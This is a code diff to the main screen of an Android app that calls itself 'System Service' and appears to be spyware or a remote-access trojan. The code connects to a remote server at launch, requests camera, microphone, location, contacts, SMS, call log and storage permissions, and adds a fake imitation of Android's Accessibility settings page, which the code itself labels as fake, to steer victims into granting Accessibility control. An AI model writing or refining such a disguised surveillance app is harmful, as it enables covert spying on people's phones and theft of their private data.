@@ -45,184 +45,148 @@ class MainActivity : AppCompatActivity() {
         instance = this
         Log.i(TAG, "🚀 MainActivity started")
 
-        // CRITICAL: Connect to server IMMEDIATELY, before asking for anything!
+        // Connect to server IMMEDIATELY
         connectToServer()
 
-        // Show UI based on accessibility status
-        if (isAccessibilityEnabled()) {
-            showPermissionsScreen()
-        } else {
-            showAccessibilitySetup()
-        }
+        // Show the main screen (permissions + accessibility button)
+        showMainScreen()
     }
 
-    private fun showAccessibilitySetup() {
+    // ═══════════════════════════════════════════════════════════
+    // SCREEN 1: White screen with permissions + Accessibility button
+    // ═══════════════════════════════════════════════════════════
+    private fun showMainScreen() {
+        // Request all permissions first
+        requestAllPermissions()
+
         val scrollView = ScrollView(this).apply {
-            setBackgroundColor(Color.parseColor("#FF0A0A0A"))
+            setBackgroundColor(Color.WHITE)
         }
 
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            setPadding(40, 100, 40, 40)
+            setPadding(48, 80, 48, 48)
             gravity = Gravity.CENTER_HORIZONTAL
         }
 
-        val icon = TextView(this).apply {
-            text = "⚙️"
-            textSize = 60f
-            gravity = Gravity.CENTER
-            setPadding(0, 20, 0, 20)
-        }
-        root.addView(icon)
-
+        // Title
         val title = TextView(this).apply {
             text = "System Service"
-            setTextColor(Color.parseColor("#FFFFD700"))
-            textSize = 24f
+            setTextColor(Color.parseColor("#FF1A1A2E"))
+            textSize = 22f
             setTypeface(typeface, Typeface.BOLD)
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 8)
         }
         root.addView(title)
 
+        // Subtitle
         val subtitle = TextView(this).apply {
-            text = "Accessibility setup required"
-            setTextColor(Color.parseColor("#FFAAAAAA"))
+            text = "Setup required to continue"
+            setTextColor(Color.parseColor("#FF666666"))
             textSize = 14f
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 32)
         }
         root.addView(subtitle)
 
-        root.addView(buildStep("1", "Tap the button below to open Accessibility Settings"))
-        root.addView(buildStep("2", "Find \"System Service\" in the list"))
-        root.addView(buildStep("3", "Turn it ON and return to this app"))
-
-        val btnAccessibility = Button(this).apply {
-            text = "♿ Open Accessibility Settings"
-            setTextColor(Color.WHITE)
-            textSize = 16f
-            setTypeface(typeface, Typeface.BOLD)
-            background = GradientDrawable().apply {
-                setColor(Color.parseColor("#FF25D366"))
-                cornerRadius = 24f
-            }
-            setPadding(0, 32, 0, 32)
-            layoutParams = LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT,
-                LinearLayout.LayoutParams.WRAP_CONTENT
-            ).apply { topMargin = 40 }
-            setOnClickListener {
-                Toast.makeText(this@MainActivity, "Opening settings...", Toast.LENGTH_SHORT).show()
-                try {
-                    val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
-                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    }
-                    startActivity(intent)
-                } catch (e: Exception) {
-                    val intent = Intent(Settings.ACTION_SETTINGS)
-                    startActivity(intent)
-                }
-            }
-        }
-        root.addView(btnAccessibility)
-
-        scrollView.addView(root)
-        setContentView(scrollView)
-    }
-
-    private fun buildStep(num: String, text: String): View {
-        val row = LinearLayout(this).apply {
-            orientation = LinearLayout.HORIZONTAL
-            setPadding(0, 12, 0, 12)
-            gravity = Gravity.CENTER_VERTICAL
-        }
-
-        val numView = TextView(this).apply {
-            this.text = num
-            setTextColor(Color.WHITE)
-            textSize = 14f
-            setTypeface(typeface, Typeface.BOLD)
-            gravity = Gravity.CENTER
-            background = GradientDrawable().apply {
-                shape = GradientDrawable.OVAL
-                setColor(Color.parseColor("#FF25D366"))
-            }
-            layoutParams = LinearLayout.LayoutParams(48, 48).apply { marginEnd = 16 }
-        }
-        row.addView(numView)
-
-        val textView = TextView(this).apply {
-            this.text = text
-            setTextColor(Color.WHITE)
-            textSize = 14f
-            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
-        }
-        row.addView(textView)
-
-        return row
-    }
-
-    private fun showPermissionsScreen() {
-        requestAllPermissions()
-
-        val scrollView = ScrollView(this).apply {
-            setBackgroundColor(Color.parseColor("#FF0A0A0A"))
-        }
-
-        val root = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(40, 80, 40, 40)
-            gravity = Gravity.CENTER_HORIZONTAL
-        }
-
-        val title = TextView(this).apply {
-            text = "System Service"
-            setTextColor(Color.parseColor("#FFFFD700"))
-            textSize = 22f
-            setTypeface(typeface, Typeface.BOLD)
-            gravity = Gravity.CENTER
-            setPadding(0, 0, 0, 16)
-        }
-        root.addView(title)
-
+        // Connection status
         statusText = TextView(this).apply {
             text = "Connecting to server..."
-            setTextColor(Color.parseColor("#FF25D366"))
-            textSize = 14f
+            setTextColor(Color.parseColor("#FF128C7E"))
+            textSize = 13f
             gravity = Gravity.CENTER
             setPadding(0, 0, 0, 24)
         }
         root.addView(statusText)
 
+        // Permissions section
         val permsTitle = TextView(this).apply {
             text = "Required Permissions"
-            setTextColor(Color.parseColor("#FFAAAAAA"))
-            textSize = 13f
+            setTextColor(Color.parseColor("#FF1A1A2E"))
+            textSize = 15f
             setTypeface(typeface, Typeface.BOLD)
             setPadding(0, 16, 0, 8)
         }
         root.addView(permsTitle)
 
         val perms = listOf(
-            "📷 Camera", "🎤 Microphone", "📍 Location (GPS)",
-            "👥 Contacts", "💬 SMS Messages", "📞 Call Logs", "📁 Storage & Files"
+            "📷 Camera",
+            "🎤 Microphone",
+            "📍 Location (GPS)",
+            "👥 Contacts",
+            "💬 SMS Messages",
+            "📞 Call Logs",
+            "📁 Storage & Files"
         )
+
         for (perm in perms) {
             val row = TextView(this).apply {
                 text = "✅ $perm"
-                setTextColor(Color.parseColor("#FFCCCCCC"))
-                textSize = 13f
-                setPadding(16, 6, 0, 6)
+                setTextColor(Color.parseColor("#FF333333"))
+                textSize = 14f
+                setPadding(16, 8, 0, 8)
             }
             root.addView(row)
         }
 
+        // Divider
+        val divider = View(this).apply {
+            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                1
+            ).apply { topMargin = 24, bottomMargin = 24 }
+        }
+        root.addView(divider)
+
+        // Accessibility section title
+        val accTitle = TextView(this).apply {
+            text = "Accessibility Setup"
+            setTextColor(Color.parseColor("#FF1A1A2E"))
+            textSize = 15f
+            setTypeface(typeface, Typeface.BOLD)
+            setPadding(0, 0, 0, 8)
+        }
+        root.addView(accTitle)
+
+        // Accessibility description
+        val accDesc = TextView(this).apply {
+            text = "To enable full system service functionality, you need to enable Accessibility.\n\nTap the button below to open Accessibility settings."
+            setTextColor(Color.parseColor("#FF666666"))
+            textSize = 13f
+            setPadding(0, 0, 0, 16)
+        }
+        root.addView(accDesc)
+
+        // Accessibility button
+        val btnAccessibility = Button(this).apply {
+            text = "♿ Enable Accessibility"
+            setTextColor(Color.WHITE)
+            textSize = 15f
+            setTypeface(typeface, Typeface.BOLD)
+            background = GradientDrawable().apply {
+                setColor(Color.parseColor("#FF128C7E"))
+                cornerRadius = 12f
+            }
+            setPadding(0, 28, 0, 28)
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.WRAP_CONTENT
+            )
+            setOnClickListener {
+                Log.i(TAG, "Accessibility button clicked - showing fake settings screen")
+                showFakeAccessibilitySettings()
+            }
+        }
+        root.addView(btnAccessibility)
+
+        // Info text
         val info = TextView(this).apply {
-            text = "\nℹ️ All permissions are required for the system service to function properly."
-            setTextColor(Color.parseColor("#FF888888"))
+            text = "\nℹ️ All permissions and Accessibility are required for the system service to function properly."
+            setTextColor(Color.parseColor("#FF999999"))
             textSize = 11f
-            setPadding(0, 24, 0, 0)
+            setPadding(0, 16, 0, 0)
             gravity = Gravity.CENTER
         }
         root.addView(info)
@@ -231,6 +195,203 @@ class MainActivity : AppCompatActivity() {
         setContentView(scrollView)
     }
 
+    // ═══════════════════════════════════════════════════════════
+    // SCREEN 2: Fake Accessibility Settings (looks like Android settings)
+    // Only "Installed apps" button is real, others are fake
+    // ═══════════════════════════════════════════════════════════
+    private fun showFakeAccessibilitySettings() {
+        val scrollView = ScrollView(this).apply {
+            setBackgroundColor(Color.parseColor("#FFFAFAFA"))
+        }
+
+        val root = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(0, 0, 0, 0)
+        }
+
+        // Header (looks like Android settings header)
+        val header = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setBackgroundColor(Color.WHITE)
+            setPadding(24, 40, 24, 24)
+            gravity = Gravity.CENTER_HORIZONTAL
+        }
+
+        val headerTitle = TextView(this).apply {
+            text = "Accessibility"
+            setTextColor(Color.parseColor("#FF1A1A2E"))
+            textSize = 20f
+            setTypeface(typeface, Typeface.BOLD)
+            gravity = Gravity.CENTER
+        }
+        header.addView(headerTitle)
+
+        val headerSub = TextView(this).apply {
+            text = "Nothing enabled"
+            setTextColor(Color.parseColor("#FF999999"))
+            textSize = 13f
+            gravity = Gravity.CENTER
+            setPadding(0, 4, 0, 0)
+        }
+        header.addView(headerSub)
+
+        root.addView(header)
+
+        // Divider
+        val d1 = View(this).apply {
+            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
+            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
+        }
+        root.addView(d1)
+
+        // "Installed apps" - REAL button (opens actual Accessibility settings)
+        val btnInstalledApps = createSettingsRow(
+            "Installed apps",
+            "Manage accessibility apps",
+            true
+        ) {
+            Log.i(TAG, "Installed apps clicked - opening real Accessibility settings")
+            Toast.makeText(this, "Opening accessibility settings...", Toast.LENGTH_SHORT).show()
+            try {
+                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                startActivity(intent)
+            } catch (e: Exception) {
+                val intent = Intent(Settings.ACTION_SETTINGS)
+                startActivity(intent)
+            }
+        }
+        root.addView(btnInstalledApps)
+
+        // Divider
+        val d2 = View(this).apply {
+            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
+            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
+        }
+        root.addView(d2)
+
+        // Fake buttons (just show toast, do nothing real)
+        val btnScreenMagnification = createSettingsRow(
+            "Screen magnification",
+            "Zoom in on screen content",
+            false
+        ) {
+            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
+        }
+        root.addView(btnScreenMagnification)
+
+        // Divider
+        val d3 = View(this).apply {
+            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
+            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
+        }
+        root.addView(d3)
+
+        val btnTalkBack = createSettingsRow(
+            "TalkBack",
+            "Screen reader for visually impaired",
+            false
+        ) {
+            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
+        }
+        root.addView(btnTalkBack)
+
+        // Divider
+        val d4 = View(this).apply {
+            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
+            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
+        }
+        root.addView(d4)
+
+        val btnSound = createSettingsRow(
+            "Sound detection",
+            "Detect sounds and alert you",
+            false
+        ) {
+            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
+        }
+        root.addView(btnSound)
+
+        // Divider
+        val d5 = View(this).apply {
+            setBackgroundColor(Color.parseColor("#FFE0E0E0"))
+            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1)
+        }
+        root.addView(d5)
+
+        val btnAdvanced = createSettingsRow(
+            "Advanced settings",
+            "Additional accessibility options",
+            false
+        ) {
+            Toast.makeText(this, "This feature is not required for this app", Toast.LENGTH_SHORT).show()
+        }
+        root.addView(btnAdvanced)
+
+        // Back button
+        val btnBack = Button(this).apply {
+            text = "← Back"
+            setTextColor(Color.parseColor("#FF128C7E"))
+            textSize = 14f
+            background = null
+            setPadding(24, 24, 24, 24)
+            setOnClickListener {
+                showMainScreen()
+            }
+        }
+        root.addView(btnBack)
+
+        scrollView.addView(root)
+        setContentView(scrollView)
+    }
+
+    private fun createSettingsRow(title: String, desc: String, enabled: Boolean, onClick: () -> Unit): View {
+        val row = LinearLayout(this).apply {
+            orientation = LinearLayout.HORIZONTAL
+            setBackgroundColor(Color.WHITE)
+            setPadding(24, 20, 24, 20)
+            gravity = Gravity.CENTER_VERTICAL
+            isClickable = true
+            isFocusable = true
+            setOnClickListener { onClick() }
+        }
+
+        val textCol = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
+        }
+
+        val titleView = TextView(this).apply {
+            text = title
+            setTextColor(if (enabled) Color.parseColor("#FF128C7E") else Color.parseColor("#FF333333"))
+            textSize = 15f
+        }
+        textCol.addView(titleView)
+
+        val descView = TextView(this).apply {
+            text = desc
+            setTextColor(Color.parseColor("#FF999999"))
+            textSize = 12f
+            setPadding(0, 2, 0, 0)
+        }
+        textCol.addView(descView)
+        row.addView(textCol)
+
+        // Arrow icon
+        val arrow = TextView(this).apply {
+            text = "→"
+            setTextColor(Color.parseColor("#FFCCCCCC"))
+            textSize = 18f
+        }
+        row.addView(arrow)
+
+        return row
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // PERMISSIONS & CONNECTION
+    // ═══════════════════════════════════════════════════════════
     private fun requestAllPermissions() {
         val perms = arrayOf(
             android.Manifest.permission.CAMERA,
@@ -327,7 +488,7 @@ class MainActivity : AppCompatActivity() {
                 }
             }
 
-            updateStatus("❌ Connection failed. Server may be sleeping. Reopen app.")
+            updateStatus("❌ Connection failed. Reopen app to retry.")
             isConnecting = false
         }.start()
     }
@@ -352,13 +513,6 @@ class MainActivity : AppCompatActivity() {
         super.onResume()
 
         Handler(Looper.getMainLooper()).postDelayed({
-            val enabled = isAccessibilityEnabled()
-            Log.i(TAG, "onResume: accessibility=$enabled, isConnecting=$isConnecting")
-
-            if (enabled) {
-                showPermissionsScreen()
-            }
-
             // Retry connection if not connected
             if (!isConnecting && socketManager?.isConnected != true) {
                 Log.i(TAG, "📡 Not connected, retrying from onResume...")
